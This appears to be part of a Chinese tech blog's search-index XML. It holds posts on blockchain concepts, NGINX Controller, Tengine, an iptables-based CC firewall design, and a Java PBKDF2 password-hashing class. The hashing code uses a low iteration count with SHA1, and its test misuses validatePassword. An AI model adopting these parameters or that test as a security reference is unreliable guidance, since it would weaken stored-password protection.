MP4流媒体的带宽控制*]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链 概述、开源]]></title>
    <url>%2F2018%2F07%2F03%2Fblock-chain%2Fblock-chain-3%2F</url>
    <content type="text"><![CDATA[开源地址 前言这是区块链相关知识的一个梳理，旨在真正的get the skill并方便他人。 知识可分为两类: 逻辑体系型的 需要思考，把各种概念连起来，或归纳，或演绎，最后，在大脑中形成一种逻辑网状结构。比如可计算理论，分布式系统，解释器等。 使用操作型的 基本不需要思考，只需要看一下目录，要用的时候参考一下手册即可。比如linux的各种命令，go,python的一些奇怪语法,elastic-search dsl的使用。 第一类知识是比较有意思的，值得多花时间，这种”逻辑网状结构”最后会形成一个”打通”的集群，可能会让你的大脑产生一些有意思的想法；而第二类，千万别花太多时间，因为很有可能让你产生消极，厌学，忧郁等情绪，而你越努力，就越可能”斯德哥尔摩”。 区块链知识可以归为第一类。 研究一个东西，需要知道它包含哪些概念，我把它分为两类: 自描述概念 不依赖其他概念的概念 他描述概念 需要依赖其他概念的概念 显然，这是一个递归的概念，可以用形式化的语言来描述，你也可以哲学的扯一大堆，但这不是我的兴趣。 下面的章节试图用原理，逻辑，应用的方式把区块链相关的概念连起来，形成”网状结构“，所有概念可在Glossary(词汇表)里查看，你可以先浏览一下，想一想他们之间的关系，再来看下面的章节。当然，最后，每个人的”网状结构”可能都不同，毕竟除了”同一性”，还有”差异性”。但，原则是一致的，有了”网状结构”，在添加新的”概念”时，我们就可以审视其在”网”中的位置，也可以思考这张”网”还缺少什么，有什么不完美之处，是不是还有”孤岛”等问题，进而有可能去完善它。 而所有的学习，无非就是完善那张网，并尽可能的正交。 这样，垃圾少了，人也轻松了。 原理1. KV(key value) There are only two hard things in Computer Science: cache invalidation and naming things. – Phil Karlton 为什么名字那么重要？因为有了名字，这个名字才能够被引用，才能够谈论其属性。 就是说，你要谈论一个人，首先得有这个人，这有点废话，但却是原理性的， 名字意味着什么？ 图灵机里面的head,没错，只有你找到head,才知道当前的(input,state),才能往下走。 汇编语言如果没有address,存储和操作也没法进行;各种编程语言的变量说的也是这个事情。 而kv中的k其实就是名字，v在不同的场合可以有不同的含义。 有了kv,就可以构造所有的数据结构，因为从递归的角度，v也可以是kv。 这个跟blockchain有关系吗？ 2. Asset(资产)在digital asset的世界，address上的数字就是资产。显然，address是key,数字是value。理解这一点很重要，blockchain主要主要的应用场景就是数字资产。 不太精确的分类: 资产数字化 相当于一个凭证，其有现实的对应物，比如股票，其实对应公司的投票分红等权利。 数字资产化 没有现实的对应物，但是可以换成现实中的钱，比如比特币。 3. Transaction(交易)而address上的数字的变更，也就是kv的变化，对应着资产的转移，就是交易(transaction)。 如果能把所有KV的变化按顺序记录起来，就达到了可溯源的目的，这跟kafka里面的stream和table的关系是一样的。 可以看出，我们可以根据交易记录，来得到目前每个地址的资产；而资产的变化必须以目前的资产为前提。 事实上，这个保证是consensus mechanism(共识机制)里面的一个检查点。 4. Currency issuance(货币发行)那么资产从哪里来呢？ 上帝说，要有光就有了光。 这里我们不去讨论历史，只从现实的货币发行制度以及比特币”怼”的方式阐述。 4.1 美元的发行流程 没钱花了，国会和总统授权财政部,发行国债 国债大部分卖给中国和日本，有钱了 又没钱花了，中国日本也不要，通过银行卖给美联储，有钱了，这个钱是凭空出来的，Currency issuance(货币发行) works 债券是有利率的，就是说偿还债务时需要比借的钱要多一些 而发行的钱=借出的钱，这多一些的钱从哪里来呢？ 唯一的办法就是继续借，也就是继续发行，否则这个系统就没法运转下去 这个系统的必然结果是: inflation(通货膨胀) 在经济增长对货币需求量增加的情况下，债务只可能越来越大 但是，只要有信心，这个系统就可以一直运行下去 并且，似乎其还有一个作用，生产力高的人更容易获得金钱 因为如果你赚的钱如果不足以覆盖你使用钱的成本，你就会被淘汰 这个系统不完美，但支撑了资本主义的高速发展 似乎繁荣,萧条的周期跟这个系统有很大的关系 它还在高速运转 4.2 比特币的发行流程比特币的创世区块，上面有一句话: “The Times 03/Jan/2009 Chancellor on brink of second bailout for banks”“财政大臣站在第二次救助银行的边缘” 这句话是当天泰晤士报头版的标题。中本聪将它写进创世区块，不但清晰地展示着比特币的诞生时间，还表达着对旧体系的嘲讽。 银行家的贪婪，政府的监守自盗，大而不倒的把戏，已经有太多的批评，这里不再赘述。 试验性质的比特币，试图回答两个问题: 谁该拥有货币发行权 货币发行量由什么决定 比特币的答案是: 众生平等，你有我有全都有 货币发行量预期固定，每4年减半 这里有太多话题性的东西: 依靠算力真的能做到去中心化？公平？民主？ 指数衰减的货币真的有利于经济发展？ 这种越早加入网络越容易拥有更多资产的机制是传销吗? 这些东西都可以去讨论。 从技术的角度，这里对应着数据的记录和计算的机制，在 distributed network(分布式网络) 的环境下，就是所谓的 consensus mechanism(共识机制)。 5. Distributed network(分布式网络)一群人 合作 来 搞事情，就形成了网络。 这里的人叫node(节点),搞事情的过程中，一个不行了，另一个顶上，就叫failover。 常见的搞事情，比如LB,replica storage等。 这里的合作遵循的规则就叫 consensus mechanism(共识机制)。 如果这群人都很聪明，并且互相信任，事情会简单很多。 很多的系统都是以此为假设进行设计的。 区块链的假设是:节点之间是互相不信任的。 区块链要干的事情就是:设计一个能让互相不信任的节点都信任的机制,然后大家可以愉快的一起搞事情。 6. Consensus mechanism(共识机制)在跟资产相关的世界里，这个机制需要做到: 确保某个address的数字只能由拥有它的人来操作 交易记录无法篡改 交易记录可追溯 比特币也是围绕这几个问题展开的，当然它还干了其他几件牛B的事情: 在去中心化的条件下解决spend twice的问题 防止通货膨胀的货币发行机制 完全的去中心化对区块链来说并不是一个必选项，就大部分的商业活动看，去中心化反而会增加很多不必要的复杂性。 发币也不是必选项。 我们先来看如何做到确保某个address的数字只能由拥有它的人来操作，交易记录无法篡改，交易记录可追溯 7. Cryptography(密码学)7.1 Asymmetric cryptography(非对称加密) 公钥加密，只有对应的私钥能够解密 加密货币中的address对应公钥(bitcoin的实现里面，为了隐藏身份，对public key做了hash),对该address的资产进行操作的唯一条件是:拥有对应的私钥。 私钥签名，公钥能够验证是不是对应的私钥签名的 把公钥和签名广播出去，nodes可以验证交易的有效性。 篡改无效签名的信息确实是签名者本人的意愿，nodes能对此进行确认。 PKI中利用CA颁发证书的方式来确定网络中的身份 对于公有链，peer可以自由加入，退出，并不需要一个中心化的CA来对身份进行认证;联盟链，peer的身份和权限可利用该机制来实现，比如hyperledger中的msp 比特币的交易: 这就回答了，如何做到确保某个address的数字只能由拥有它的人来操作的问题。 7.2 SHA(Secure Hash Algorithm) 任意长度的数据-&gt;固定长度的数据 相同input-&gt;相同output 冲突几率很小,改变input的一个字符，output都会不同 验证hash value很容易，反推很难 计算一个任意长度input的hash value非常快，但是给出一个output，要算出input却非常难，目前只有遍历试验的方法。Bitcoin中会根据目前的平均出块速度，给出一个ouput,谁先构造出hash(input)小于该output的数据，谁就拥有当前出块的权利。这个遍历试验的过程就叫做挖矿(mining)，当某个peer找到符合条件的input,它会广播给其他peer,其他peer对其进行验证，这个遍历试验并向大家证明的过程，就叫做POW;而每一次出块会有一定的奖励，这个奖励是比特币产生(coinbase)的唯一方式,而区块中确认交易的output和input的差额就是给记账peer的手续费(transaction fee)。 而做到交易记录无法篡改和可追溯,还需要block chain这种数据结构。 8. Hash chain &amp;&amp; Block chainblock chain其实是一种特殊的hash chain。 首先，数据是存在分布式网络的各个节点中的，这些节点有可能有些是坏人，”不可篡改“是指整个分布式网络对外提供的block chain data是”不可篡改”的。恶意节点的篡改，得不到承认，并且不影响对外的服务。 比特币中的好人们商量好:我们只认best block chain,就是符合规则(consensus mechanism)并且最长的那条链。 下面结合block chain的具体结构和相应的consensus mechanism来说明,why”不可篡改”? block chain数据结构的特点是: 链式存储，从任何一个block可以找到其前面的block 且每一个block(Genesis block除外)有上一个block的hash 由于hash的”冲突几率很小,改变input的一个字符，output都会不同“的特性，改变一个区块的数据将会导致后面区块的hash对不上，也许你会说,”改变后面block的hash不就行了？”，但是，由于后面的block也改变了，那么其hash也改变了，而一个block有效的一个必要条件: hash(block)&lt;根据当前平均出块速度计算出的target 系统会计算当前1小时的平均出块速度，动态调整difficulty,得出一个target，而一个有效的区块，不但要拥有前一个区块的hash,还必须计算出一个nonce,使得当前block的hash值小于该target。 这意味着，改变任何一个block,并且想跟上目前最长的链，需要重做生成后面所有block的工作量。 而这是非常难的。 理论上，跟所有honest peers竞争，掌握51%以上的算力是有可能对数据进行篡改的，但是，假如你的算力真的非常强，你可以把交易都篡改了，这是否能让你的利益最大化呢？首先，这个篡改肯定会被发现，当honest peers发现很长的不匹配block时，会发出告警，然后用户也会知道，这会导致什么结果呢？一个必然的结果是：系统无法被人信任，价值归0。而拥有强大的算力，并且选择做honest peer，你会获得不错的稳定收益;这就导致强大的算力更倾向于做honest peer,而拥有越多强大算力的honest peer,整个系统就越难被攻破。这就是人性，这就是市场。 所以，比特币里面不可篡改的保证靠的是:POW + block chain存储 + 激励措施的博弈 但是，这里一个很致命的问题是:POW太浪费电了…… 那么，有没有既不浪费电又能够保证”不可篡改”的办法呢？ 至少，在”去中心化”的条件下是很难实现的。 PoS(Proof of Stake) 相当于越有钱，越有话语权(挖矿或者确认交易)，意思是越有钱越想维持这个系统，越不会想破坏这个系统，从而数据也是”不可篡改的”;但是，这个将导致一个很明显的结果:有钱的会越来越有钱。越来越集中化。 PBFT(Practical Byzantine Fault Tolerance )? 意思是n个peers互相交换对new block的看法，然后honest peer取majority(n-1)的看法来决定new block是否合法,可以证明，只要坏人不超过 (n-1) / 3 ，整个系统就是按honest peer来运行的。 “不可篡改”的保证在于:你需要majority的同意(一般通过签名来保证)，而少数恶意节点显然做不到。 为了交易速度和省电，目前很多加密货币采用了Pos;而PBFT由于需要知道有多少其他peers并能识别其签名，一般适合私有链，联盟链。 需要注意的是，区块链里面说的共识算法，跟一般分布式系统里面的paxos,raft等一致性协议相比,除了关注网络本身的失效外，还需要对数据的安全性，合约的有效性做很多的工作。 9. Blockchain(区块链)所以，其实给区块链下一个定义不是一件容易的事情。 wikipedia: A blockchain, originally block chain, is a continuously growing list of records, called blocks, which are linked and secured using cryptography. Each block typically contains a cryptographic hash of the previous block, a timestamp and transaction data. investopedia: A blockchain is a digitized, decentralized, public ledger of all cryptocurrency transactions. Constantly growing as ‘completed’ blocks (the most recent transactions) are recorded and added to it in chronological order, it allows market participants to keep track of digital currency transactions without central recordkeeping. Each node (a computer connected to the network) gets a copy of the blockchain, which is downloaded automatically. 百度百科: 狭义来讲，区块链是一种按照时间顺序将数据区块以顺序相连的方式组合成的一种链式数据结构， 并以密码学方式保证的不可篡改和不可伪造的分布式账本。 广义来讲，区块链技术是利用块链式数据结构来验证与存储数据、利用分布式节点共识算法来生成和更新数据、利用密码学的方式保证数据传输和访问的安全、利用由自动化脚本代码组成的智能合约来编程和操作数据的一种全新的分布式基础架构与计算方式。 感觉每一个说得都很有道理,也确实都很有道理。 不管如何，上面说的原理部分，基本上就是区块链最核心的部分，虽然各种具体实现有很多细节的不同，但原理就这些了。 而根据区块链发展的历史，智能合约的引入就进入了所谓的区块链2.0时代。 连接移动端,Iot就进入了所谓的区块链3.0时代。 是不是有种被时代抛弃的感觉？劳资还在守着java当饭碗，侬都区块链3.0了？ 10. Smart contract(智能合约)10.1 比特币的脚本语言其实代表区块链1.0的比特币也没有那么不智能，我们来看其交易验证的逻辑: 交易必须遵守以下规则: 任何一个input必须来自于某一个output 一笔交易，可以有多个input,多个output 为了方便，input被spend后就作废了，如果有change(找零)，也体现在output中 可以推断，这科树的叶子记录的address对应的资产就是当前整个比特币的资产状况 叶子上的output也叫UTXO(Unspent Transaction Output) 有效的input必须来自UTXO UXTO里面有public key的hash,对其操作必须提供private key签名和public key 网络节点根据共识机制维护公共账本,这实际上解决了spend twice的问题 这里的验证逻辑就是contract(合约)。 Public script包含了UTXO对应的Publick key的hash Signature script包含了private key的签名以及public key 被签名的信息包含下一个UXTO的Public script和amount 这里的script是一种非图灵完备的stack-based的脚本语言。 Public script：1OP_DUP OP_HASH160 &lt;PubkeyHash&gt; OP_EQUALVERIFY OP_CHECKSIG Signature script1&lt;Sig&gt; &lt;PubKey&gt; OP_DUP OP_HASH160 &lt;PubkeyHash&gt; OP_EQUALVERIFY OP_CHECKSIG 其执行过程如下: 每个节点都会对收到的transaction自动执行以上的验证逻辑。 而如果支持图灵完备语言来编写合约，并可动态部署，就叫智能合约。 10.2 Hyperledger-fabric的chaincode以太坊，超级账本等区块链2.0平台支持智能合约，本质上就是提供一个可编程的区块链平台，底层的区块链存储，一致性机制等通用的东西给你搭好了，你可以在上面很方便的编写自己的应用。 可以理解为一种paas,编程框架和云平台的结合。 下面就Hyperledger-fabric的chaincode来做具体说明。 所谓编写chaincode,其实就是提供一些服务，这些服务会对KV进行操作，这里的隐含条件是: KV的变更其实就是transaction,会遵守consensus记录到公共账本上 对某个Key的操作，是否需要相应的权限，取决于你的实现 大家约定需要权限，那就需要权限，约定不需要，那就不需要；也可以某些需要，某些不需要 原则上比特币的coinbase,PubScript+SigScript解锁的操作方式都可以实现在chaincode中 所以，其实chaincode的framework其实只是提供了get,set的最基本的方法 部署chaincode和调用chaincode的权限也是可以大家商量的 这种非常灵活的方式，能做的东西非常多 但是整个权限的约定，chaincode的编写，部署都非常繁琐 并且现在hyperledger fabric并没有一个统一的管理这些东西的地方 不理解底层原理，搞起来还是相当麻烦 联系方式QQ群:300911873 目前正在迭代的项目: https://github.com/foolcage/mastering-fabric https://github.com/foolcage/fooltrader 欢迎关注 一起探讨]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx-controller]]></title>
    <url>%2F2018%2F07%2F03%2Fload-balance%2Fnginx-controller%2F</url>
    <content type="text"><![CDATA[好用软件推荐nginx-plus监控官方网站-nginx-controller 密码加密 图谱 简介 NGINX Controller是所有NGINX Plus实例的集中管理平台。 使用Controller，您可以在多云环境中轻松管理多个NGINX Plus服务器。 使用直观的向导样式界面，您可以创建NGINX Plus的新实例，并集中配置负载平衡，URL路由和SSL终止等功能。 Controller具有丰富的监控和警报功能，有助于确保应用程序的可用性，性能和可靠性。 Controller基于最佳实践提供对200个关键指标和抢先推荐的深入可见性，使ITOps和DevOps团队能够首先避免性能问题，并解决可能出现的任何问题。 功能实时监控和警报 获得关于应用程序性能的重要见解： 关键指标的图表，例如每秒请求数，活动连接数，带宽使用情况 根据预定义的阈值提醒100多个指标，如CPU使用率，400/500错误和运行状况检查失败 使用REST API轻松集成您选择的任何监控工具 仪表板 使用以下命令快速监控NGINX plus实例并对其进行故障排除： 概述仪表板，用于汇总负载均衡器中的指标 应用程序健康评分，用于衡量成功请求和及时响应 可自定义的仪表板，用于监控特定于您的环境的指标 先发制人的建议 使用内置配置分析器获取： 基于成千上万客户的学习，增强了性能和安全性 通过遵循内置的最佳实践来获得更好的SLA。 抢先和可行的建议： 组态 安全 SSL状态 简化的配置管理 导航一个简单直观的向导式用户界面，用于： NGINX Plus配置的指导工作流程 负载平衡器的按钮部署 流量路由到上游服务器 SSL密钥和证书管理 政策驱动的管理 通过开发多个特定于环境的策略来加速应用程序部署。创建配置环境： 分期 生产 具体业务范围]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈区块链对互联网的冲击]]></title>
    <url>%2F2018%2F07%2F02%2Fblock-chain%2Fblock-chain-0%2F</url>
    <content type="text"><![CDATA[区块链 起源于比特币、不对、应该是说、区块链理论的第一应用是比特币 是日本一位大佬、看透了金融行业金融机构对货币的管理和控制能力、金融机构可以任意发行货币、日本那次经济危机有关吧、 区块链涉及的新技术 有： 去中心化、采取共识机制来获取最值得信任的交易链、 智能合约、不借助第三方签订协议、这种协议一旦生效不可修改、可追溯 去中心化： 现在互联网技术的交易基本上都是有第三方担保、比如淘宝的支付宝、以及货币发行机构各大银行 这种新技术是怎么改变互联网世界的架构的呢？ 首先这种不适用第三方担保的协议、可以无视第三方支付平台的兴衰而动荡、 然后结合去中心化和智能合约、有些人头一次接触这种思维方式、于是很多人的思考就诞生了一波思维风暴 银行去中心化、货币去中心化、法律去中心化、等等各个行业的去中心化、共识机制、其实我觉得蛮不现实的、机器会共识、人可不一定、人心可以收买的、没有一个良好的信任体系、共识机制也只是一个泡沫而已 再说智能合约、法律智能合约、货币交易智能合约、物联网智能合约、也是各个方面各个行业都可以嵌入 智能合约可以用来在多方的情况下、动态的签署一份使用合约、随后由去中心化的货币再进行支付自动转账 法律：甲乙丙三方 签订一个合约、到期后合约执行、货币支付或者行为交易、这份合约保存到信任链条中永久保存 物联网：家电、车、购物、都可以接入智能合约、进行一个行为合约、然后通知货币链支付 看起来就一个完全自由化的社会 关于共识机制的解决方案 公有链——对任何人开放，任何人都能参与公有链通常也称为非许可链（Permissionless Blockchain）， 任何人都可以参与区块链数据维护和读取，容易部署应用程序，完全去中心化不受任何机构控制。 公有链的应用非常广泛，例如资产证券化、数字资产的跨链流通 ……现在市场上的主流大势区块链项目比特币、以太坊、量子链、EOS、唯链以及Neo等都是公有链项目。 公有链是真正意义上的完全去中心化的区块链，它通过密码学保证交易不可篡改，同时也利用密码学验证以及经济上的激励， 在互为陌生的网络环境中建立共识，从而形成去中心化的信用机制。在公有链中的共识机制一般是工作量证明（PoW）和权益证明（PoS） 。 公有链具有通过去中介化的方式打破当前中心化商业模式的潜力， 而且本身无需维护服务器或管理系统，从根本上降低创建和运行去中心化应用程序（dApp）的成本。 联盟链——仅对联盟成员开放联盟链是一种需要注册许可的区块链，这种区块链也称为许可链（Permissioned Blockchain）。 联盟链仅限于联盟成员参与，联盟规模可以大到国与国之间，也可以是不同的机构企业之间。 区块链上的读写权限、参与记账权限按联盟规则来制定。 整个网络由成员机构共同维护，网络接入一般通过成员机构的网关节点接入，共识过程由预先选好的节点控制。 因此联盟链一般不采用工作量证明的挖矿机制，而是多采用权益证明（PoS）或PBFT（Practical Byzantine Fault Tolerant）、RAFT等共识算法。 和公有链最高每秒完成交易3-20相比，联盟链可以达到1000-10000 ，交易速度更快且交易成本大幅降低。 联盟链可以解决结算问题，降低两地结算的成本和时间，适合于机构间的交易、结算等B2B场景，因此金融行业应用最广泛。 其中最知名的就是R3CVE组织，即R3联盟，有包括花旗银行、中国平安银行、纽约梅隆银行在内的50多家银行机构加入 私有链——仅行业内部透明，不对外开放私有链，仅限于企业、国家机构或者单独个体使用，不完全能够解决信任问题，但是可以改善可审计性。 常用于企业内部的数据库管理、审计等，政府的预算和执行，或者政府的行业统计数据等。 他们彼此之间需要透明，但没必要对外公众透明。 私有链的价值主要是提供安全、可追溯、不可篡改、自动执行的运算平台， 可以同时防范来自内部和外部对数据的安全攻击，这个在传统的系统是很难做到的。 任何人都可以创建私链的平台的Multichain项目本身就是一个私有链项目。 另： 123456789101112不管区块链是不是泡沫。反正各大佬已经部署未来了、阿里、腾讯、百度、京东也在看形势、还有众多小企业在瞄准区块链猛打擦边球、毕竟这是一个机会也是一个机遇、不走未必能活、走了就可能一夜发达、互联网时代、数据时代、人工智能时代、区块链时代、小视频时代、老博客时代、共享社会、这个世界、名词化社会、动不动就我们重新定义了XXX、、、、、这样拉融资也算个噱头、、不过也可以看出机遇、机会是真的多、看准未来【未来在变、我们也要变】、and 、坚持以获成功]]></content>
      <categories>
        <category>block-chain</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[慢哈希加密]]></title>
    <url>%2F2018%2F07%2F02%2Fencryption%2Fpassword-java-pbkdf2%2F</url>
    <content type="text"><![CDATA[PBKDF2算法【三种】介绍： wiki 加盐密码哈希：如何正确使用 PBKDF2加密的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168//PBKDF2import javax.crypto.SecretKeyFactory;import javax.crypto.spec.PBEKeySpec;import java.math.BigInteger;import java.security.NoSuchAlgorithmException;import java.security.SecureRandom;import java.security.spec.InvalidKeySpecException;/** * Created by huoyan403 on 3/21/2017. */public class PasswordEncryption &#123; public static final String PBKDF2_ALGORITHM = &quot;PBKDF2WithHmacSHA1&quot;; // The following constants may be changed without breaking existing hashes. /** * 盐的长度---不宜过短 */ public static final int SALT_BYTE_SIZE = 48 / 2; /** * 生成密文的长度 */ public static final int HASH_BYTE_SIZE = 32 / 2; /** * 迭代次数 */ public static final int PBKDF2_ITERATIONS = 1000; public static final int ITERATION_INDEX = 0; public static final int SALT_INDEX = 1; public static final int PBKDF2_INDEX = 2; /** * Returns a salted PBKDF2 hash of the password. * 加密password * @param password the password to hash * @return a salted PBKDF2 hash of the password */ public static String createHash(String password) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; return createHash(password.toCharArray()); &#125; /** * Returns a salted PBKDF2 hash of the password. * * @param password the password to hash * @return a salted PBKDF2 hash of the password */ public static String createHash(char[] password) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; // Generate a random salt SecureRandom random = new SecureRandom(); byte[] salt = new byte[SALT_BYTE_SIZE]; random.nextBytes(salt); // Hash the password byte[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE); // format iterations:salt:hash return PBKDF2_ITERATIONS + &quot;:&quot; + toHex(salt) + &quot;:&quot; + toHex(hash); &#125; /** * Validates a password using a hash. * 验证密码是否正确 需传password和 加密后的序列值 * @param password the password to check * @param correctHash the hash of the valid password * @return true if the password is correct, false if not */ public static boolean validatePassword(String password, String correctHash) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; return validatePassword(password.toCharArray(), correctHash); &#125; /** * Validates a password using a hash. * * @param password the password to check * @param correctHash the hash of the valid password * @return true if the password is correct, false if not */ public static boolean validatePassword(char[] password, String correctHash) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; // Decode the hash into its parameters String[] params = correctHash.split(&quot;:&quot;); int iterations = Integer.parseInt(params[ITERATION_INDEX]); byte[] salt = fromHex(params[SALT_INDEX]); byte[] hash = fromHex(params[PBKDF2_INDEX]); // Compute the hash of the provided password, using the same salt, // iteration count, and hash length byte[] testHash = pbkdf2(password, salt, iterations, hash.length); // Compare the hashes in constant time. The password is correct if // both hashes match. return slowEquals(hash, testHash); &#125; /** * Compares two byte arrays in length-constant time. This comparison method * is used so that password hashes cannot be extracted from an on-line * system using a timing attack and then attacked off-line. * * @param a the first byte array * @param b the second byte array * @return true if both byte arrays are the same, false if not */ private static boolean slowEquals(byte[] a, byte[] b) &#123; int diff = a.length ^ b.length; for(int i = 0; i &lt; a.length &amp;&amp; i &lt; b.length; i++) diff |= a[i] ^ b[i]; return diff == 0; &#125; /** * Computes the PBKDF2 hash of a password. * * @param password the password to hash. * @param salt the salt * @param iterations the iteration count (slowness factor) * @param bytes the length of the hash to compute in bytes * @return the PBDKF2 hash of the password */ private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8); SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM); return skf.generateSecret(spec).getEncoded(); &#125; /** * Converts a string of hexadecimal characters into a byte array. * * @param hex the hex string * @return the hex string decoded into a byte array */ private static byte[] fromHex(String hex) &#123; byte[] binary = new byte[hex.length() / 2]; for(int i = 0; i &lt; binary.length; i++) &#123; binary[i] = (byte)Integer.parseInt(hex.substring(2*i, 2*i+2), 16); &#125; return binary; &#125; /** * Converts a byte array into a hexadecimal string. * * @param array the byte array to convert * @return a length*2 character string encoding the byte array */ private static String toHex(byte[] array) &#123; BigInteger bi = new BigInteger(1, array); String hex = bi.toString(16); int paddingLength = (array.length * 2) - hex.length(); if(paddingLength &gt; 0) return String.format(&quot;%0&quot; + paddingLength + &quot;d&quot;, 0) + hex; else return hex; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 //test类import com.meirengu.common.PasswordEncryption;import static com.meirengu.common.PasswordEncryption.createHash;import static com.meirengu.common.PasswordEncryption.validatePassword;/** * Created by huoyan403 on 3/21/2017. */public class PasswordEncryptionTest &#123; /** * Tests the basic functionality of the PasswordHash class * * @param args ignored */ public static void main(String[] args) &#123; try &#123; // Print out 10 hashes for(int i = 0; i &lt; 10; i++) System.out.println(createHash(&quot;p\r\nassw0Rd!&quot;)); // Test password validation boolean failure = false; System.out.println(&quot;Running tests...&quot;); for(int i = 0; i &lt; 100; i++) &#123; String password = &quot;&quot;+i; String hash = createHash(password); String secondHash = createHash(password); if(hash.equals(secondHash)) &#123; System.out.println(&quot;FAILURE: TWO HASHES ARE EQUAL!&quot;); failure = true; &#125; String wrongPassword = &quot;&quot;+(i+1); if(PasswordEncryption.validatePassword(wrongPassword,password)) &#123; System.out.println(&quot;FAILURE: WRONG PASSWORD ACCEPTED!&quot;); failure = true; &#125; if(!PasswordEncryption.validatePassword(password, hash)) &#123; System.out.println(&quot;FAILURE: GOOD PASSWORD NOT ACCEPTED!&quot;); failure = true; &#125; &#125; if(failure) System.out.println(&quot;TESTS FAILED!&quot;); else System.out.println(&quot;TESTS PASSED!&quot;); System.err.print(validatePassword(&quot;&quot;,&quot;1000:29bcf0ef3b1f33698b2254415caf7c81957770883a8b65b7:d9cb6f281a95c4a44415b5e5e37fb607&quot;)); System.err.print(createHash(&quot;123456&quot;)); &#125; catch(Exception ex) &#123; System.out.println(&quot;ERROR: &quot; + ex); &#125; &#125;&#125; 123456123456----加密后--&gt;1000:29bcf0ef3b1f33698b2254415caf7c81957770883a8b65b7:d9cb6f281a95c4a44415b5e5e37fb60不可逆 验证只能使用validataPassword(&quot;原密码&quot;，&quot;加密后密码&quot;)遵从原则：密码不通过where 1=1 and password = #&#123;password&#125;保证代码验证过程中没有任何地方使用原密码原文查询、比对]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tengine]]></title>
    <url>%2F2018%2F07%2F01%2Fgithub%2Ftengine%2F</url>
    <content type="text"><![CDATA[基于nginx更强大的web服务器负载均衡器简介Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。 从2011年12月开始，Tengine成为一个开源项目，Tengine团队在积极地开发和维护着它。Tengine团队的核心成员来自于淘宝、搜狗等互联网企业。Tengine是社区合作的成果，我们欢迎大家参与其中，贡献自己的力量。 Tengine文档http://tengine.taobao.org https://github.com/alibaba/tengine]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Strom的日志实时流量分析主动防御(CCFirewall)系统]]></title>
    <url>%2F2018%2F07%2F01%2Fgithub%2Fcc-iptable%2F</url>
    <content type="text"><![CDATA[CC防火墙 github 地址简介CC防火墙的架构采用Flume+Kafka+Strom+Zookeeper+Mysql实现,实现异常IP的及时封停功能 组件 Flume :部署在所有的Nginx服务器上，将Nginx日志推送至Kafka中， Kafka : 临时存储Nginx的log数据 Strom ：从Kafka取数据并进行数据分析 Zookeeper ：存储CC防火墙的配置文件，并且所有部署在Squid上的客户端也注册在这个Zookeeper上。 Agent ：部署在每台Squid上，并且信息注册到Zookeeper的临时节点上，接收到封停指令后通过iptables封锁IP。 Strom拓扑 KafkaSpOut：进行Kafka数据的读取，这里为了方便与简单，并且保证顺序性Kafka内只是用一个Partion。 LogFormatBolt : 收到KafkaSpout读取出的Nginx日志后进行格式化处理，并在此使用纯真库进行IP GEO匹配 IpAnalysis ： 几乎所有的逻辑都在这里实现，如IP的计数器，报警的匹配等等，为了可以动态调整防火墙的配置，配置文件保存在Zookeeper中，也是在这里Watch Zookeeper的节点，达到动态改变配置的。 BlockBolt ： 接收到IpAnalysis 发送的信息后，将异常的信息通过Thrift发送给各个Squid机器。 UnBlockBolt ： 接收到BlockBolt成功封锁后的IP后经过一段时间进行解封。 BlockReportBlot ： 做数据统计用的，对整体的作用不大 xStoreBolt ： 数据库存储Bolt，拓扑上的IPStoreBolt，BlockStoreBolt，BlockReportStoreBolt 都是使用的这一个Bolt。 Thrit封存解封接口service CCfirewall{ string blockipbyiptables(1:string mkey,2: string ip) string unblockipbyiptables(1:string mkey,2: string ip) } Zookeeper目录目录树 . └─ccfirewall ├─config //存储防火墙配置信息 └─agent_list //存储Agent列表 └─iptables //使用iptables封锁的站点 ├─10.0.0.1 ├─10.0.0.1 ├─... config配置 { &quot;count&quot;: &quot;50&quot;, //IP计数个数 &quot;if_block&quot;: &quot;true&quot;, //是否开启封停 &quot;if_warning&quot;: &quot;false&quot;, //是否开启警告 &quot;threshold_w_secound&quot;: &quot;10&quot;, //警告阈值秒数 &quot;threshold_secound&quot;: &quot;20&quot;, //封停阈值秒数 &quot;block_second&quot;: &quot;864000&quot;, //封停秒数 &quot;ip_white_list&quot;: [ //IP白名单 &quot;127.0.0.1&quot;, &quot;211.103.231.10&quot; ], &quot;url_list&quot;: [{ //URL黑名单 &quot;url&quot;: &quot;all&quot;, //全部 &quot;type&quot;: &quot;normal&quot; //normal (精确) 或 after (向后模糊) }], &quot;special_rule&quot;: { //特殊规则 